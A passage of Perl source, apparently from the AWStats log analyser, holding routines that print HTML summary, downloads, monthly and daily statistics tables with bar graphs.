        if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
        if ( $max_k > 0 ) {
            $bredde_k =
                int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
                    1;
        }
        if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
        my $newkey = lc($key);
        if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
            print
                "<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/ip.png\" height=\"14\""
                    . AltTitle("$Message[0]")
                    . " /></td><td class=\"aws\">$Message[0]</td><td>$newkey</td>";
        }
        else {
            print
                "<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/$newkey.png\" height=\"14\""
                    . AltTitle("$newkey")
                    . " /></td><td class=\"aws\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>";
        }
        ## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
        if ( $ShowDomainsStats =~ /U/i ) {
            $_domener_u = (
                $_domener_p{$key}
                    ? $_domener_p{$key} / $TotalPages
                    : 0
            );
            $_domener_u += ( $_domener_h{$key} / $TotalHits );
            $_domener_u =
                sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
            print "<td>".Format_Number($_domener_u)." ("
                . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
                . ")</td>";
        }
        if ( $ShowDomainsStats =~ /V/i ) {
            $_domener_v = (
                $_domener_p{$key}
                    ? $_domener_p{$key} / $TotalPages
                    : 0
            );
            $_domener_v += ( $_domener_h{$key} / $TotalHits );
            $_domener_v =
                sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
            print "<td>".Format_Number($_domener_v)." ("
                . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
                . ")</td>";
        }
        if ( $ShowDomainsStats =~ /P/i ) {
            print "<td>".Format_Number($_domener_p{$key})."</td>";
        }
        if ( $ShowDomainsStats =~ /H/i ) {
            print "<td>".Format_Number($_domener_h{$key})."</td>";
        }
        if ( $ShowDomainsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>";
        }
        print "<td class=\"aws\">";
        if ( $ShowDomainsStats =~ /P/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\""
                    . AltTitle( "$Message[56]: " . int( $_domener_p{$key} ) )
                    . " /><br />\n";
        }
        if ( $ShowDomainsStats =~ /H/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\""
                    . AltTitle( "$Message[57]: " . int( $_domener_h{$key} ) )
                    . " /><br />\n";
        }
        if ( $ShowDomainsStats =~ /B/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"5\""
                    . AltTitle(
                    "$Message[75]: " . Format_Bytes( $_domener_k{$key} ) )
                    . " />";
        }
        print "</td>";
        print "</tr>\n";
        $total_u += $_domener_u;
        $total_v += $_domener_v;
        $total_p += $_domener_p{$key};
        $total_h += $_domener_h{$key};
        $total_k += $_domener_k{$key} || 0;
        $count++;
    }
    my $rest_u = $TotalUnique - $total_u;
    my $rest_v = $TotalVisits - $total_v;
    $rest_p = $TotalPages - $total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if (   $rest_u > 0
        || $rest_v > 0
        || $rest_p > 0
        || $rest_h > 0
        || $rest_k > 0 )
    {    # All other domains (known or not)
        print
            "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>"; }
        if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>"; }
        if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>"; }
        if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>"; }
        if ( $ShowDomainsStats =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        print "<td class=\"aws\">&nbsp;</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads code frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDownloads{
    my $regext         = qr/\.(\w{1,6})$/;
    print "$Center<a name=\"downloads\">&nbsp;</a><br />\n";
    &tab_head( $Message[178], 19, 0, "downloads" );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[178]</th>";
    if ( $ShowFileTypesStats =~ /H/i ){print "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>"
        ."<th bgcolor=\"#$color_h\" width=\"80\">206 $Message[57]</th>"; }
    if ( $ShowFileTypesStats =~ /B/i ){
        print "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
        print "<th bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    print "</tr>\n";
    my $count = 0;
    for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
        print "<tr>";
        my $ext = Get_Extension($regext, $u);
        if ( !$ext) {
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/unknown.png\""
                . AltTitle("")
                . " /></td>";
        }
        else {
            my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
            my $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || "&nbsp;";
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
                . AltTitle("")
                . " /></td>";
        }
        print "<td class=\"aws\">";
        &HTMLShowURLInfo($u);
        print "</td>";
        if ( $ShowFileTypesStats =~ /H/i ){
            print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_HITS'})."</td>";
            print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_206'})."</td>";
        }
        if ( $ShowFileTypesStats =~ /B/i ){
            print "<td>".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'})."</td>";
            print "<td>".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/
                ($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'})))."</td>";
        }
        print "</tr>\n";
        $count++;
        if ($count >= $MaxRowsInHTMLOutput){last;}
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Summary section at the top of the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSummary{
    if ($Debug) { debug( "ShowSummary", 2 ); }
    # FirstTime LastTime
    my $FirstTime = 0;
    my $LastTime  = 0;
    foreach my $key ( keys %FirstTime ) {
        my $keyqualified = 0;
        if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
        if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
        if ($keyqualified) {
            if ( $FirstTime{$key}
                && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
            {
                $FirstTime = $FirstTime{$key};
            }
            if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
                $LastTime = $LastTime{$key};
            }
        }
    }

    #print "$Center<a name=\"summary\">&nbsp;</a><br />\n";
    my $title = "$Message[128]";
    &tab_head( "$title", 0, 0, 'month' );

    my $NewLinkParams = ${QueryString};
    $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
    $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
    $NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
    $NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
    $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
    $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
    $NewLinkParams =~ s/^&amp;//;
    $NewLinkParams =~ s/&amp;$//;
    if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
    my $NewLinkTarget = '';

    if ( $FrameName eq 'mainright' ) {
        $NewLinkTarget = " target=\"_parent\"";
    }

    # Ratio
    my $RatioVisits = 0;
    my $RatioPages  = 0;
    my $RatioHits   = 0;
    my $RatioBytes  = 0;
    if ( $TotalUnique > 0 ) {
        $RatioVisits = int( $TotalVisits / $TotalUnique * 100 ) / 100;
    }
    if ( $TotalVisits > 0 ) {
        $RatioPages = int( $TotalPages / $TotalVisits * 100 ) / 100;
    }
    if ( $TotalVisits > 0 ) {
        $RatioHits = int( $TotalHits / $TotalVisits * 100 ) / 100;
    }
    if ( $TotalVisits > 0 ) {
        $RatioBytes =
            int( ( $TotalBytes / 1024 ) * 100 /
                ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;
    }

    my $colspan = 5;
    my $w       = '20';
    if ( $LogType eq 'W' || $LogType eq 'S' ) {
        $w       = '17';
        $colspan = 6;
    }

    # Show first/last
    print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
    print
        "<td class=\"aws\"><b>$Message[133]</b></td><td class=\"aws\" colspan=\""
            . ( $colspan - 1 ) . "\">\n";
    print( $MonthRequired eq 'all'
        ? "$Message[6] $YearRequired"
        : "$Message[5] "
        . $MonthNumLib{$MonthRequired}
        . " $YearRequired"
    );
    print "</td></tr>\n";
    print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
    print "<td class=\"aws\"><b>$Message[8]</b></td>\n";
    print "<td class=\"aws\" colspan=\""
        . ( $colspan - 1 ) . "\">"
        . ( $FirstTime ? Format_Date( $FirstTime, 0 ) : "NA" ) . "</td>";
    print "</tr>\n";
    print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
    print "<td class=\"aws\"><b>$Message[9]</b></td>\n";
    print "<td class=\"aws\" colspan=\""
        . ( $colspan - 1 ) . "\">"
        . ( $LastTime ? Format_Date( $LastTime, 0 ) : "NA" )
        . "</td>\n";
    print "</tr>\n";

    # Show main indicators title row
    print "<tr>";
    if ( $LogType eq 'W' || $LogType eq 'S' ) {
        print "<td bgcolor=\"#$color_TableBGTitle\">&nbsp;</td>";
    }
    if ( $ShowSummary =~ /U/i ) {
        print "<td width=\"$w%\" bgcolor=\"#$color_u\""
            . Tooltip(2)
            . ">$Message[11]</td>";
    }
    else {
        print
            "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
    }
    if ( $ShowSummary =~ /V/i ) {
        print "<td width=\"$w%\" bgcolor=\"#$color_v\""
            . Tooltip(1)
            . ">$Message[10]</td>";
    }
    else {
        print
            "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
    }
    if ( $ShowSummary =~ /P/i ) {
        print "<td width=\"$w%\" bgcolor=\"#$color_p\""
            . Tooltip(3)
            . ">$Message[56]</td>";
    }
    else {
        print
            "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
    }
    if ( $ShowSummary =~ /H/i ) {
        print "<td width=\"$w%\" bgcolor=\"#$color_h\""
            . Tooltip(4)
            . ">$Message[57]</td>";
    }
    else {
        print
            "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
    }
    if ( $ShowSummary =~ /B/i ) {
        print "<td width=\"$w%\" bgcolor=\"#$color_k\""
            . Tooltip(5)
            . ">$Message[75]</td>";
    }
    else {
        print
            "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
    }
    print "</tr>\n";

    # Show main indicators values for viewed traffic
    print "<tr>";
    if ( $LogType eq 'M' ) {
        print "<td class=\"aws\">$Message[165]</td>";
        print "<td>&nbsp;<br />&nbsp;</td>\n";
        print "<td>&nbsp;<br />&nbsp;</td>\n";
        if ( $ShowSummary =~ /H/i ) {
            print "<td><b>".Format_Number($TotalHits)."</b>"
                . (
                $LogType eq 'M'
                    ? ""
                    : "<br />($RatioHits&nbsp;"
                    . lc( $Message[57] . "/" . $Message[12] ) . ")"
            )
                . "</td>";
        }
        else { print "<td>&nbsp;</td>"; }
        if ( $ShowSummary =~ /B/i ) {
            print "<td><b>"
                . Format_Bytes( int($TotalBytes) )
                . "</b><br />($RatioBytes&nbsp;$Message[108]/"
                . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]
                . ")</td>";
        }
        else { print "<td>&nbsp;</td>"; }
    }
    else {
        if ( $LogType eq 'W' || $LogType eq 'S' ) {
            print "<td class=\"aws\">$Message[160]&nbsp;*</td>";
        }
        if ( $ShowSummary =~ /U/i ) {
            print "<td>"
                . (
                $MonthRequired eq 'all'
                    ? "<b>&lt;= ".Format_Number($TotalUnique)."</b><br />$Message[129]"
                    : "<b>".Format_Number($TotalUnique)."</b><br />&nbsp;"
            )
                . "</td>";
        }
        else { print "<td>&nbsp;</td>"; }
        if ( $ShowSummary =~ /V/i ) {
            print
                "<td><b>".Format_Number($TotalVisits)."</b><br />($RatioVisits&nbsp;$Message[52])</td>";
        }
        else { print "<td>&nbsp;</td>"; }
        if ( $ShowSummary =~ /P/i ) {
            print "<td><b>".Format_Number($TotalPages)."</b><br />($RatioPages&nbsp;"
                . $Message[56] . "/"
                . $Message[12]
                . ")</td>";
        }
        else { print "<td>&nbsp;</td>"; }
        if ( $ShowSummary =~ /H/i ) {
            print "<td><b>".Format_Number($TotalHits)."</b>"
                . (
                $LogType eq 'M'
                    ? ""
                    : "<br />($RatioHits&nbsp;"
                    . $Message[57] . "/"
                    . $Message[12] . ")"
            )
                . "</td>";
        }
        else { print "<td>&nbsp;</td>"; }
        if ( $ShowSummary =~ /B/i ) {
            print "<td><b>"
                . Format_Bytes( int($TotalBytes) )
                . "</b><br />($RatioBytes&nbsp;$Message[108]/"
                . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]
                . ")</td>";
        }
        else { print "<td>&nbsp;</td>"; }
    }
    print "</tr>\n";

    # Show main indicators values for not viewed traffic values
    if ( $LogType eq 'M' || $LogType eq 'W' || $LogType eq 'S' ) {
        print "<tr>";
        if ( $LogType eq 'M' ) {
            print "<td class=\"aws\">$Message[166]</td>";
            print "<td>&nbsp;<br />&nbsp;</td>\n";
            print "<td>&nbsp;<br />&nbsp;</td>\n";
            if ( $ShowSummary =~ /H/i ) {
                print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>";
            }
            else { print "<td>&nbsp;</td>"; }
            if ( $ShowSummary =~ /B/i ) {
                print "<td><b>"
                    . Format_Bytes( int($TotalNotViewedBytes) )
                    . "</b></td>";
            }
            else { print "<td>&nbsp;</td>"; }
        }
        else {
            if ( $LogType eq 'W' || $LogType eq 'S' ) {
                print "<td class=\"aws\">$Message[161]&nbsp;*</td>";
            }
            print "<td colspan=\"2\">&nbsp;<br />&nbsp;</td>\n";
            if ( $ShowSummary =~ /P/i ) {
                print "<td><b>".Format_Number($TotalNotViewedPages)."</b></td>";
            }
            else { print "<td>&nbsp;</td>"; }
            if ( $ShowSummary =~ /H/i ) {
                print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>";
            }
            else { print "<td>&nbsp;</td>"; }
            if ( $ShowSummary =~ /B/i ) {
                print "<td><b>"
                    . Format_Bytes( int($TotalNotViewedBytes) )
                    . "</b></td>";
            }
            else { print "<td>&nbsp;</td>"; }
        }
        print "</tr>\n";
    }
    &tab_end($LogType eq 'W'
        || $LogType eq 'S' ? "* $Message[159]" : "" );
}

#------------------------------------------------------------------------------
# Function:     Prints the Monthly section on the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainMonthly{
    if ($Debug) { debug( "ShowMonthStats", 2 ); }
    print "$Center<a name=\"month\">&nbsp;</a><br />\n";
    my $title = "$Message[162]";
    &tab_head( "$title", 0, 0, 'month' );
    print "<tr><td align=\"center\">\n";
    print "<center>\n";

    my $average_nb = my $average_u = my $average_v = my $average_p = 0;
    my $average_h = my $average_k = 0;
    my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
    my $max_v = my $max_p = my $max_h = my $max_k = 1;

    # Define total and max
    for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
        my $monthix = sprintf( "%02s", $ix );
        $total_u += $MonthUnique{ $YearRequired . $monthix } || 0;
        $total_v += $MonthVisits{ $YearRequired . $monthix } || 0;
        $total_p += $MonthPages{ $YearRequired . $monthix }  || 0;
        $total_h += $MonthHits{ $YearRequired . $monthix }   || 0;
        $total_k += $MonthBytes{ $YearRequired . $monthix }  || 0;

        #if (($MonthUnique{$YearRequired.$monthix}||0) > $max_v) { $max_v=$MonthUnique{$YearRequired.$monthix}; }
        if (
            ( $MonthVisits{ $YearRequired . $monthix } || 0 ) > $max_v )
        {
            $max_v = $MonthVisits{ $YearRequired . $monthix };
        }

        #if (($MonthPages{$YearRequired.$monthix}||0) > $max_p)  { $max_p=$MonthPages{$YearRequired.$monthix}; }
        if ( ( $MonthHits{ $YearRequired . $monthix } || 0 ) > $max_h )
        {
            $max_h = $MonthHits{ $YearRequired . $monthix };
        }
        if ( ( $MonthBytes{ $YearRequired . $monthix } || 0 ) > $max_k )
        {
            $max_k = $MonthBytes{ $YearRequired . $monthix };
        }
    }

    # Define average
    # TODO

    # Show bars for month
    my $graphdone=0;
    foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
    {
        my @blocklabel = ();
        for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
            my $monthix = sprintf( "%02s", $ix );
            push @blocklabel,
                "$MonthNumLib{$monthix}\n$YearRequired";
        }
        my @vallabel = (
            "$Message[11]", "$Message[10]",
            "$Message[56]", "$Message[57]",
            "$Message[75]"
        );
        my @valcolor =
            ( "$color_u", "$color_v", "$color_p", "$color_h",
                "$color_k" );
        my @valmax = ( $max_v, $max_v, $max_h, $max_h, $max_k );
        my @valtotal =
            ( $total_u, $total_v, $total_p, $total_h, $total_k );
        my @valaverage = ();

        #my @valaverage=($average_v,$average_p,$average_h,$average_k);
        my @valdata = ();
        my $xx      = 0;
        for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
            my $monthix = sprintf( "%02s", $ix );
            $valdata[ $xx++ ] = $MonthUnique{ $YearRequired . $monthix }
                || 0;
            $valdata[ $xx++ ] = $MonthVisits{ $YearRequired . $monthix }
                || 0;
            $valdata[ $xx++ ] = $MonthPages{ $YearRequired . $monthix }
                || 0;
            $valdata[ $xx++ ] = $MonthHits{ $YearRequired . $monthix }
                || 0;
            $valdata[ $xx++ ] = $MonthBytes{ $YearRequired . $monthix }
                || 0;
        }

        my $function = "ShowGraph_$pluginname";
        &$function(
            "$title",        "month",
            $ShowMonthStats, \@blocklabel,
            \@vallabel,      \@valcolor,
            \@valmax,        \@valtotal,
            \@valaverage,    \@valdata
        );
        $graphdone=1;
    }
    if (! $graphdone)
    {
        print "<table>\n";
        print "<tr valign=\"bottom\">";
        print "<td>&nbsp;</td>\n";
        for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
            my $monthix  = sprintf( "%02s", $ix );
            my $bredde_u = 0;
            my $bredde_v = 0;
            my $bredde_p = 0;
            my $bredde_h = 0;
            my $bredde_k = 0;
            if ( $max_v > 0 ) {
                $bredde_u =
                    int(
                        ( $MonthUnique{ $YearRequired . $monthix } || 0 ) /
                            $max_v * $BarHeight ) + 1;
            }
            if ( $max_v > 0 ) {
                $bredde_v =
                    int(
                        ( $MonthVisits{ $YearRequired . $monthix } || 0 ) /
                            $max_v * $BarHeight ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_p =
                    int(
                        ( $MonthPages{ $YearRequired . $monthix } || 0 ) /
                            $max_h * $BarHeight ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_h =
                    int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /
                        $max_h * $BarHeight ) + 1;
            }
            if ( $max_k > 0 ) {
                $bredde_k =
                    int(
                        ( $MonthBytes{ $YearRequired . $monthix } || 0 ) /
                            $max_k * $BarHeight ) + 1;
            }
            print "<td>";
            if ( $ShowMonthStats =~ /U/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vu'}\" height=\"$bredde_u\" width=\"6\""
                        . AltTitle( "$Message[11]: "
                        . ( $MonthUnique{ $YearRequired . $monthix }
                        || 0 ) )
                        . " />";
            }
            if ( $ShowMonthStats =~ /V/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"6\""
                        . AltTitle( "$Message[10]: "
                        . ( $MonthVisits{ $YearRequired . $monthix }
                        || 0 ) )
                        . " />";
            }
            if ( $ShowMonthStats =~ /P/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
                        . AltTitle( "$Message[56]: "
                        . ( $MonthPages{ $YearRequired . $monthix } || 0 )
                    )
                        . " />";
            }
            if ( $ShowMonthStats =~ /H/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
                        . AltTitle( "$Message[57]: "
                        . ( $MonthHits{ $YearRequired . $monthix } || 0 )
                    )
                        . " />";
            }
            if ( $ShowMonthStats =~ /B/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
                        . AltTitle(
                        "$Message[75]: "
                            . Format_Bytes(
                            $MonthBytes{ $YearRequired . $monthix }
                        )
                    )
                        . " />";
            }
            print "</td>\n";
        }
        print "<td>&nbsp;</td>";
        print "</tr>\n";

        # Show lib for month
        print "<tr valign=\"middle\">";

        #if (!$StaticLinks) {
        #	print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=12&year=".($YearRequired-1))."\">&lt;&lt;</a></td>";
        #}
        #else {
        print "<td>&nbsp;</td>";

        #				}
        for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
            my $monthix = sprintf( "%02s", $ix );

            #			if (!$StaticLinks) {
            #				print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=$monthix&year=$YearRequired")."\">$MonthNumLib{$monthix}<br />$YearRequired</a></td>";
            #			}
            #			else {
            print "<td>"
                . (
                !$StaticLinks
                    && $monthix == $nowmonth
                    && $YearRequired == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print "$MonthNumLib{$monthix}<br />$YearRequired";
            print(   !$StaticLinks
                && $monthix == $nowmonth
                && $YearRequired == $nowyear ? '</span>' : '' );
            print "</td>";

            #					}
        }

        #		if (!$StaticLinks) {
        #			print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=1&year=".($YearRequired+1))."\">&gt;&gt;</a></td>";
        #		}
        #		else {
        print "<td>&nbsp;</td>";

        #				}
        print "</tr>\n";
        print "</table>\n";
    }
    print "<br />\n";

    # Show data array for month
    if ($AddDataArrayMonthStats) {
        print "<table>\n";
        print
            "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">$Message[5]</td>";
        if ( $ShowMonthStats =~ /U/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_u\""
                . Tooltip(2)
                . ">$Message[11]</td>";
        }
        if ( $ShowMonthStats =~ /V/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_v\""
                . Tooltip(1)
                . ">$Message[10]</td>";
        }
        if ( $ShowMonthStats =~ /P/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_p\""
                . Tooltip(3)
                . ">$Message[56]</td>";
        }
        if ( $ShowMonthStats =~ /H/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_h\""
                . Tooltip(4)
                . ">$Message[57]</td>";
        }
        if ( $ShowMonthStats =~ /B/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_k\""
                . Tooltip(5)
                . ">$Message[75]</td>";
        }
        print "</tr>\n";
        for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
            my $monthix = sprintf( "%02s", $ix );
            print "<tr>";
            print "<td>"
                . (
                !$StaticLinks
                    && $monthix == $nowmonth
                    && $YearRequired == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print "$MonthNumLib{$monthix} $YearRequired";
            print(   !$StaticLinks
                && $monthix == $nowmonth
                && $YearRequired == $nowyear ? '</span>' : '' );
            print "</td>";
            if ( $ShowMonthStats =~ /U/i ) {
                print "<td>",
                    Format_Number($MonthUnique{ $YearRequired . $monthix }
                        ? $MonthUnique{ $YearRequired . $monthix }
                        : "0"), "</td>";
            }
            if ( $ShowMonthStats =~ /V/i ) {
                print "<td>",
                    Format_Number($MonthVisits{ $YearRequired . $monthix }
                        ? $MonthVisits{ $YearRequired . $monthix }
                        : "0"), "</td>";
            }
            if ( $ShowMonthStats =~ /P/i ) {
                print "<td>",
                    Format_Number($MonthPages{ $YearRequired . $monthix }
                        ? $MonthPages{ $YearRequired . $monthix }
                        : "0"), "</td>";
            }
            if ( $ShowMonthStats =~ /H/i ) {
                print "<td>",
                    Format_Number($MonthHits{ $YearRequired . $monthix }
                        ? $MonthHits{ $YearRequired . $monthix }
                        : "0"), "</td>";
            }
            if ( $ShowMonthStats =~ /B/i ) {
                print "<td>",
                    Format_Bytes(
                        int( $MonthBytes{ $YearRequired . $monthix } || 0 )
                    ), "</td>";
            }
            print "</tr>\n";
        }

        # Average row
        # TODO
        # Total row
        print
            "<tr><td bgcolor=\"#$color_TableBGRowTitle\">$Message[102]</td>";
        if ( $ShowMonthStats =~ /U/i ) {
            print
                "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_u)."</td>";
        }
        if ( $ShowMonthStats =~ /V/i ) {
            print
                "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_v)."</td>";
        }
        if ( $ShowMonthStats =~ /P/i ) {
            print
                "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_p)."</td>";
        }
        if ( $ShowMonthStats =~ /H/i ) {
            print
                "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_h)."</td>";
        }
        if ( $ShowMonthStats =~ /B/i ) {
            print "<td bgcolor=\"#$color_TableBGRowTitle\">"
                . Format_Bytes($total_k) . "</td>";
        }
        print "</tr>\n";
        print "</table>\n<br />\n";
    }

    print "</center>\n";
    print "</td></tr>\n";
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Daily section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
#				$firstdaytoshowtime, $lastdaytoshowtime
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaily{
    my $firstdaytocountaverage = shift;
    my $lastdaytocountaverage = shift;
    my $firstdaytoshowtime = shift;
    my $lastdaytoshowtime = shift;

    if ($Debug) { debug( "ShowDaysOfMonthStats", 2 ); }
    print "$Center<a name=\"daysofmonth\">&nbsp;</a><br />\n";

    my $NewLinkParams = ${QueryString};
    $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
    $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
    $NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
    $NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
    $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
    $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
    $NewLinkParams =~ s/^&amp;//;
    $NewLinkParams =~ s/&amp;$//;
    if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
    my $NewLinkTarget = '';

    if ( $FrameName eq 'mainright' ) {
        $NewLinkTarget = " target=\"_parent\"";
    }

    my $title = "$Message[138]";

    if ($AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"".(XMLEncode(
            "$AddLinkToExternalCGIWrapper". "?section=DAY&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 0, 0, 'daysofmonth' );
    print "<tr>";
    print "<td align=\"center\">\n";
    print "<center>\n";

    my $average_v = my $average_p = 0;
    my $average_h = my $average_k = 0;
    my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
    my $max_v = my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
    foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
    {
        $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
        my $year  = $1;
        my $month = $2;
        my $day   = $3;
        if ( !DateIsValid( $day, $month, $year ) ) {
            next;
        }    # If not an existing day, go to next
        $total_v += $DayVisits{ $year . $month . $day } || 0;
        $total_p += $DayPages{ $year . $month . $day }  || 0;
        $total_h += $DayHits{ $year . $month . $day }   || 0;
        $total_k += $DayBytes{ $year . $month . $day }  || 0;
        if ( ( $DayVisits{ $year . $month . $day } || 0 ) > $max_v ) {
            $max_v = $DayVisits{ $year . $month . $day };
        }

        #if (($DayPages{$year.$month.$day}||0) > $max_p)  { $max_p=$DayPages{$year.$month.$day}; }
        if ( ( $DayHits{ $year . $month . $day } || 0 ) > $max_h ) {
            $max_h = $DayHits{ $year . $month . $day };
        }
        if ( ( $DayBytes{ $year . $month . $day } || 0 ) > $max_k ) {
            $max_k = $DayBytes{ $year . $month . $day };
